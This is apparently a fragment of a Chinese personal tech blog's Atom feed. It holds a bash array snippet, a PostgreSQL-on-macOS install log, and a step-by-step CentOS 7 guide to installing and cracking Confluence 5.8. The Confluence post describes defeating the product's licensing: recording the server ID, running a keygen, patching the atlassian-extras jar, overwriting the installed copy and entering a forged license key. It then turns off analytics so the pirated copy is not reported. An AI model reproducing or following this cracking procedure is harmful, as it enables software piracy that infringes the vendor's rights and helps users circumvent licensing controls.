class="variable">@Ubuntu</span><span class="symbol">:~</span><span class="comment"># echo $&#123;a[@]&#125;</span></span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span> b c d</span><br><span class="line">root<span class="variable">@Ubuntu</span><span class="symbol">:~</span><span class="comment"># for i in $&#123;a[@]&#125;; do echo $i; done</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line">b</span><br><span class="line">c</span><br><span class="line">d</span><br></pre></td></tr></table></figure>]]>
    
    </summary>
    
      <category term="shell" scheme="http://yoursite.com/tags/shell/"/>
    
      <category term="it" scheme="http://yoursite.com/categories/it/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[centos7 安装破解confluence 5.8]]></title>
    <link href="http://yoursite.com/2016/04/05/centos7-%E5%AE%89%E8%A3%85%E7%A0%B4%E8%A7%A3confluence-5-8/"/>
    <id>http://yoursite.com/2016/04/05/centos7-安装破解confluence-5-8/</id>
    <published>2016-04-05T03:09:57.000Z</published>
    <updated>2016-04-12T02:38:32.000Z</updated>
    <content type="html"><![CDATA[<h3 id="u5B89_u88C5_jdk"><a href="#u5B89_u88C5_jdk" class="headerlink" title="安装 jdk"></a>安装 jdk</h3><pre><code>$ yum install -y java-1.7.0-openjdk.x86_64
$ java -version
java version &quot;1.7.0_99&quot;
OpenJDK Runtime Environment (rhel-2.6.5.0.el7_2-x86_64 u99-b00)
OpenJDK 64-Bit Server VM (build 24.95-b01, mixed mode)
</code></pre><a id="more"></a>
<h3 id="u5B89_u88C5_u6570_u636E_u5E93"><a href="#u5B89_u88C5_u6570_u636E_u5E93" class="headerlink" title="安装数据库"></a>安装数据库</h3><p><del>本来打算直接用 mariadb 的, 但是 confluence 不支持这个驱动.只能另外装 mysql 了, 下面这小段作废, 直接跳 mysql 安装</del></p>
<pre><code>yum install -y mariadb*
systemctl start mariadb.service
systemctl enable mariadb.service
mysql_secure_installation  #一路 yes 下去

#解决中文乱码问题
vim /etc/my.cnf
[mysqld]
character-set-server =utf8
重启服务
</code></pre><p>centos7 yum 源不带 mysql, 需要自己安装 yum 源</p>
<pre><code>wget http://repo.mysql.com/mysql-community-release-el7-5.noarch.rpm
rpm -ivh mysql-community-release-el7-5.noarch.rpm
yum install mysql-server
</code></pre><h3 id="u5F00_u59CB_u5B89_u88C5_confluence"><a href="#u5F00_u59CB_u5B89_u88C5_confluence" class="headerlink" title="开始安装 confluence"></a>开始安装 confluence</h3><pre><code>$ chmod u+x /usr/local/confluence-5.8.10-x64.bin
$ /usr/local/confluence-5.8.10-x64.bin
Unpacking JRE ...
Starting Installer ...
四月 05, 2016 3:13:16 下午 java.util.prefs.FileSystemPreferences$1 run
INFO: Created user preferences directory.

This will install Confluence 5.8.10 on your computer.
OK [o, Enter], Cancel [c]

Choose the appropriate installation or upgrade option.
Please choose one of the following:
Express Install (uses default settings) [1],
Custom Install (recommended for advanced users) [2, Enter],
Upgrade an existing Confluence installation [3]
1
See where Confluence will be installed and the settings that will be used.
Installation Directory: /opt/atlassian/confluence
Home Directory: /var/atlassian/application-data/confluence
HTTP Port: 8090
RMI Port: 8000
Install as service: Yes
Install [i, Enter], Exit [e]
i
</code></pre><p>http访问</p>
<pre><code>http://your.centos.ip:8090
</code></pre><p>点击安装, 记录 serverid : BH9S-DN8I-F20N-QN2C</p>
<p><img src="http://7xpsj5.com1.z0.glb.clouddn.com/confluence-crack1.png" alt="confluence-crack1"></p>
<h3 id="u7834_u89E3"><a href="#u7834_u89E3" class="headerlink" title="破解"></a>破解</h3><p>停止wiki服务, 进行破解</p>
<pre><code>$ /etc/init.d/confluence stop
executing using dedicated user
If you encounter issues starting up Confluence, please see the Installation guide at http://confluence.atlassian.com/display/DOC/Confluence+Installation+Guide

Server startup logs are located in /opt/atlassian/confluence/logs/catalina.out
Using CATALINA_BASE:   /opt/atlassian/confluence
Using CATALINA_HOME:   /opt/atlassian/confluence
Using CATALINA_TMPDIR: /opt/atlassian/confluence/temp
Using JRE_HOME:        /opt/atlassian/confluence/jre/
Using CLASSPATH:       /opt/atlassian/confluence/bin/bootstrap.jar:/opt/atlassian/confluence/bin/tomcat-juli.jar
Using CATALINA_PID:    /opt/atlassian/confluence/work/catalina.pid
Tomcat stopped.


cp /opt/atlassian/confluence/confluence/WEB-INF/lib/atlassian-extras-decoder-v2-3.2.jar /tmp/atlassian-extras-2.4.jar
</code></pre><p>破解将在 mac 本地进行, 因为需要图形界面…</p>
<pre><code>➜ /Users/cristaly7/tmp &gt;scp -r HD_Server_Config:/root/confluence5.8/confluence5.1-crack .
➜ /Users/cristaly7/tmp &gt;cd confluence5.1-crack/iNViSiBLE
➜ /Users/cristaly7/tmp/confluence5.1-crack/iNViSiBLE &gt;chmod u+x keygen_MacOSX.sh

# 按照网上的文章运行命令
/System/Library/Frameworks/JavaVM.framework/Versions/1.6/Home/bin/java -jar confluence_keygen.jar
zsh: no such file or directory: /System/Library/Frameworks/JavaVM.framework/Versions/1.6/Home/bin/java
➜ /Users/cristaly7/tmp/confluence5.1-crack/iNViSiBLE &gt;java -v
No Java runtime present, requesting install.
</code></pre><p>没有java, 需要安装 java</p>
<p><a href="http://www.oracle.com/technetwork/java/javase/downloads/index.html" target="_blank" rel="external">下载 java</a>  </p>
<p>运行破解程序</p>
<pre><code>➜ /Users/cristaly7/tmp/confluence5.1-crack/iNViSiBLE &gt;java -jar confluence_keygen.jar
</code></pre><p>输入 serverid , 点击. patch</p>
<p><img src="http://7xpsj5.com1.z0.glb.clouddn.com/confluence-crack2.png" alt=""></p>
<p>选择 <code>confluence5.1-crack</code> 文件夹里的 <code>atlassian-extras-2.4.jar</code> </p>
<p><img src="http://7xpsj5.com1.z0.glb.clouddn.com/confluence-crack3.png" alt=""></p>
<p>点击.gen 会生成 key, 并且<code>confluence5.1-crack</code> 文件夹会多出一个<code>atlassian-extras-2.4.bak</code></p>
<p><img src="http://7xpsj5.com1.z0.glb.clouddn.com/confluence-crack4.png" alt=""></p>
<p>拷贝破解的文件到安装目录进行覆盖</p>
<pre><code>➜ /Users/cristaly7/tmp/confluence5.1-crack &gt;scp atlassian-extras-2.4.jar HD_Server_Config:/opt/atlassian/confluence/confluence/WEB-INF/lib
</code></pre><p>开启 wiki 服务</p>
<pre><code>$ service confluence start
</code></pre><p>在 License key 那里输入刚才生成的 key</p>
<p>拷贝 mysql 驱动</p>
<pre><code>cp mysql-connector-java-5.1.32-bin.jar  /opt/atlassian/confluence/confluence/WEB-INF/lib/
</code></pre><p>重启服务</p>
<pre><code>service confluence restart
</code></pre><h3 id="u5B89_u88C5_u9875_u9762_u914D_u7F6E"><a href="#u5B89_u88C5_u9875_u9762_u914D_u7F6E" class="headerlink" title="安装页面配置"></a>安装页面配置</h3><p>在页面上，选择数据库“MySQL”，点击“ Externam Database”</p>
<p>登录mysql 创建数据库及账号</p>
<pre><code>mysql -uroot -p
create database wiki character set UTF8;
grant all on wiki.* to wiki_user@&quot;%&quot; identified by &quot;wiki_password&quot;;
</code></pre><p>我这里装的是 percona 5.6</p>
<p>确定存储引擎是 InnoDB</p>
<p>在页面上点击“Direct JDBC”</p>
<p>填写db信息</p>
<p>Driver Class Name不用变</p>
<p>Database URL，修正对应ip、port、database，例如：</p>
<pre><code>jdbc:mysql://localhost:3306/wiki?useUnicode=true&amp;characterEncoding=UTF8&amp;sessionVariables=storage_engine%3DInnoDB
</code></pre><p>上面的连接符是”<code>&amp;amp;</code>”不是”&amp;”，这样是没有问题的，如果你要用”&amp;”也可以尝试，但后面可能出错</p>
<p>点击“Next”，此时可能会有一个比较长的等待，如果此处出错了，停掉wiki服务，卸载wiki，删掉wiki文件，卸载数据库，从第一步重新来。</p>
<p>如果上一步成功的话，点击“Empty Site”。你也可以点击“Example Site”</p>
<p>点击“Manage users and groups within Confluence”，设置管理员相关信息。这里是“下一步”还是“确定”忘了，点击即可</p>
<h3 id="u57FA_u672C_u4F7F_u7528"><a href="#u57FA_u672C_u4F7F_u7528" class="headerlink" title="基本使用"></a>基本使用</h3><h3 id="u5751"><a href="#u5751" class="headerlink" title="坑"></a>坑</h3><h4 id="u90AE_u4EF6_u914D_u7F6E_u4E0D_u80FD_u6210_u529F"><a href="#u90AE_u4EF6_u914D_u7F6E_u4E0D_u80FD_u6210_u529F" class="headerlink" title="邮件配置不能成功"></a>邮件配置不能成功</h4><p>无论是直接配置 smtp, 还是修改配置文件配置 JNxx的, 都不行</p>
<p>配置 smtp 直接说验证失败</p>
<p>配置 JNxx 的, 每次一点击测试邮件发送, 就找不到页面, 并且网上也没有解决方案, 太令人暴躁了</p>
<h4 id="u4E0A_u4F20_u7684_doc__u4E2D_u6587_u9644_u4EF6_u663E_u793A_u4E71_u7801"><a href="#u4E0A_u4F20_u7684_doc__u4E2D_u6587_u9644_u4EF6_u663E_u793A_u4E71_u7801" class="headerlink" title="上传的 doc 中文附件显示乱码"></a>上传的 doc 中文附件显示乱码</h4><h4 id="mysql-bin_log__u5F88_u5927_21"><a href="#mysql-bin_log__u5F88_u5927_21" class="headerlink" title="mysql-bin log 很大!"></a>mysql-bin log 很大!</h4><p>什么原因? confluence 刷了很多这样的日志:</p>
<pre><code>&lt;/com.atlassian.confluence.schedule.ScheduledJobHistory&gt;
&lt;com.atlassian.confluence.schedule.ScheduledJobHistory&gt;
  &lt;startDate&gt;2016-04-12 09:29:42.126 CST&lt;/startDate&gt;
  &lt;endDate&gt;2016-04-12 09:29:42.126 CST&lt;/endDate&gt;
&lt;/com.atlassian.confluence.schedule.ScheduledJobHistory&gt;
&lt;com.atlassian.confluence.schedule.ScheduledJobHistory&gt;
  &lt;startDate&gt;2016-04-12 09:44:42.126 CST&lt;/startDate&gt;
  &lt;endDate&gt;2016-04-12 09:44:42.127 CST&lt;/endDate&gt;
&lt;/com.atlassian.confluence.schedule.ScheduledJobHistory&gt;
&lt;com.atlassian.confluence.schedule.ScheduledJobHistory&gt;
  &lt;startDate&gt;2016-04-12 09:59:42.126 CST&lt;/startDate&gt;
  &lt;endDate&gt;2016-04-12 09:59:42.126 CST&lt;/endDate&gt;
&lt;/com.atlassian.confluence.schedule.ScheduledJobHistory&gt;
&lt;com.atlassian.confluence.schedule.ScheduledJobHistory&gt;
  &lt;startDate&gt;2016-04-12 10:14:42.126 CST&lt;/startDate&gt;
  &lt;endDate&gt;2016-04-12 10:14:42.126 CST&lt;/endDate&gt;
&lt;/com.atlassian.confluence.schedule.ScheduledJobHistory&gt;
&lt;com.atlassian.confluence.schedule.ScheduledJobHistory&gt;
  &lt;startDate&gt;2016-04-12 10:29:42.126 CST&lt;/startDate&gt;
  &lt;endDate&gt;2016-04-12 10:29:42.126 CST&lt;/endDate&gt;
&lt;/com.atlassian.confluence.schedule.ScheduledJobHistory&gt;
</code></pre><p><em>General Configuration &gt; Scheduled Jobs</em> 到这里可以进行设置和关闭任务调度, 然而不知道关了会有啥后果, 真是操蛋玩意!</p>
<h4 id="Analytics__u6027_u80FD_u6536_u96C6_u53D1_u9001"><a href="#Analytics__u6027_u80FD_u6536_u96C6_u53D1_u9001" class="headerlink" title="Analytics 性能收集发送"></a>Analytics 性能收集发送</h4><p>这个会收集 confluence 使用情况发送到 confluence 公司….尼玛老子用的破解版的啊, 还发送, 果断关闭</p>
<p>未完待续….</p>
<p>参考:</p>
<p><a href="http://www.jianshu.com/p/d7e253db24d9" target="_blank" rel="external">创业工具之知识管理：Confluence</a></p>
<p><a href="http://www.jianshu.com/p/27cb54b4a81a" target="_blank" rel="external">知识管理Confluence：常用基本操作</a></p>
<p><a href="http://www.tuicool.com/articles/7FvuMn" target="_blank" rel="external">CentOS安装confluence(WIKI)</a></p>
<p><a href="http://www.centoscn.com/image-text/install/2015/1121/6441.html" target="_blank" rel="external">centos安装confluence及破解</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h3 id="u5B89_u88C5_jdk"><a href="#u5B89_u88C5_jdk" class="headerlink" title="安装 jdk"></a>安装 jdk</h3><pre><code>$ yum install -y java-1.7.0-openjdk.x86_64
$ java -version
java version &quot;1.7.0_99&quot;
OpenJDK Runtime Environment (rhel-2.6.5.0.el7_2-x86_64 u99-b00)
OpenJDK 64-Bit Server VM (build 24.95-b01, mixed mode)
</code></pre>]]>
    
    </summary>
    
      <category term="confluence" scheme="http://yoursite.com/tags/confluence/"/>
    
      <category term="it" scheme="http://yoursite.com/categories/it/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[mac os 安装使用postgresql]]></title>
    <link href="http://yoursite.com/2016/04/01/mac-os-%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8postgresql/"/>
    <id>http://yoursite.com/2016/04/01/mac-os-安装使用postgresql/</id>
    <published>2016-04-01T08:42:33.000Z</published>
    <updated>2016-04-08T03:27:53.000Z</updated>
    <content type="html"><![CDATA[<h3 id="u5B89_u88C5"><a href="#u5B89_u88C5" class="headerlink" title="安装"></a>安装</h3><pre><code>➜ /Users/cristaly7/Desktop/15/15 &gt;brew install postgres
==&gt; Downloading https://homebrew.bintray.com/bottles/postgresql-9.4.5_2.el_capitan.bottle.tar.gz
######################################################################## 100.0%
==&gt; Pouring postgresql-9.4.5_2.el_capitan.bottle.tar.gz
==&gt; Caveats
If builds of PostgreSQL 9 are failing and you have version 8.x installed,
you may need to remove the previous version first. See:
  https://github.com/Homebrew/homebrew/issues/2510

To migrate existing data from a previous major version (pre-9.4) of PostgreSQL, see:
  https://www.postgresql.org/docs/9.4/static/upgrading.html

To load postgresql:
  launchctl load ~/Library/LaunchAgents/homebrew.mxcl.postgresql.plist
Or, if you don&apos;t want/need launchctl, you can just run:
  postgres -D /usr/local/var/postgres
==&gt; Summary
🍺  /usr/local/Cellar/postgresql/9.4.5_2: 3,021 files, 33.7M
</code></pre><a id="more"></a>
<h3 id="u521D_u59CB_u5316"><a href="#u521D_u59CB_u5316" class="headerlink" title="初始化"></a>初始化</h3><pre><code>➜ /Users/cristaly7 &gt;initdb ~/postgresql
The files belonging to this database system will be owned by user &quot;cristaly7&quot;.
This user must also own the server process.

The database cluster will be initialized with locales
  COLLATE:  en_US.UTF-8
  CTYPE:    zh_CN.UTF-8
  MESSAGES: en_US.UTF-8
  MONETARY: en_US.UTF-8
  NUMERIC:  en_US.UTF-8
  TIME:     en_US.UTF-8
The default database encoding has accordingly been set to &quot;UTF8&quot;.
initdb: could not find suitable text search configuration for locale &quot;zh_CN.UTF-8&quot;
The default text search configuration will be set to &quot;simple&quot;.

Data page checksums are disabled.

creating directory /Users/cristaly7/postgresql ... ok
creating subdirectories ... ok
selecting default max_connections ... 100
selecting default shared_buffers ... 128MB
selecting dynamic shared memory implementation ... posix
creating configuration files ... ok
creating template1 database in /Users/cristaly7/postgresql/base/1 ... ok
initializing pg_authid ... ok
initializing dependencies ... ok
creating system views ... ok
loading system objects&apos; descriptions ... ok
creating collations ... ok
creating conversions ... ok
creating dictionaries ... ok
setting privileges on built-in objects ... ok
creating information schema ... ok
loading PL/pgSQL server-side language ... ok
vacuuming database template1 ... ok
copying template1 to template0 ... ok
copying template1 to postgres ... ok
syncing data to disk ... ok

WARNING: enabling &quot;trust&quot; authentication for local connections
You can change this by editing pg_hba.conf or using the option -A, or
--auth-local and --auth-host, the next time you run initdb.

Success. You can now start the database server using:

    postgres -D /Users/cristaly7/postgresql
or
    pg_ctl -D /Users/cristaly7/postgresql -l logfile start
</code></pre><h3 id="u542F_u52A8_u4E0E_u505C_u6B62"><a href="#u542F_u52A8_u4E0E_u505C_u6B62" class="headerlink" title="启动与停止"></a>启动与停止</h3><pre><code>➜ /Users/cristaly7 &gt;pg_ctl -D /Users/cristaly7/postgresql -l ~/postgresql/logfile start
server starting

➜ /Users/cristaly7 &gt;pg_ctl -D ~/postgresql stop -s -m fast
</code></pre><p>### </p>
<p>参考:</p>
<p><a href="http://blog.everlose.com/mac-homebrew-postgresql.html" target="_blank" rel="external">Mac下使用homebrew安装postgresql及配置</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h3 id="u5B89_u88C5"><a href="#u5B89_u88C5" class="headerlink" title="安装"></a>安装</h3><pre><code>➜ /Users/cristaly7/Desktop/15/15 &gt;brew install postgres
==&gt; Downloading https://homebrew.bintray.com/bottles/postgresql-9.4.5_2.el_capitan.bottle.tar.gz
######################################################################## 100.0%
==&gt; Pouring postgresql-9.4.5_2.el_capitan.bottle.tar.gz
==&gt; Caveats
If builds of PostgreSQL 9 are failing and you have version 8.x installed,
you may need to remove the previous version first. See:
  https://github.com/Homebrew/homebrew/issues/2510

To migrate existing data from a previous major version (pre-9.4) of PostgreSQL, see:
  https://www.postgresql.org/docs/9.4/static/upgrading.html

To load postgresql:
  launchctl load ~/Library/LaunchAgents/homebrew.mxcl.postgresql.plist
Or, if you don&apos;t want/need launchctl, you can just run:
  postgres -D /usr/local/var/postgres
==&gt; Summary
🍺  /usr/local/Cellar/postgresql/9.4.5_2: 3,021 files, 33.7M
</code></pre>]]>
    
    </summary>
    
      <category term="os x" scheme="http://yoursite.com/tags/os-x/"/>
    
      <category term="postgresql" scheme="http://yoursite.com/tags/postgresql/"/>
    
      <category term="it" scheme="http://yoursite.com/categories/it/"/>
    
  </entry>
  
</feed>
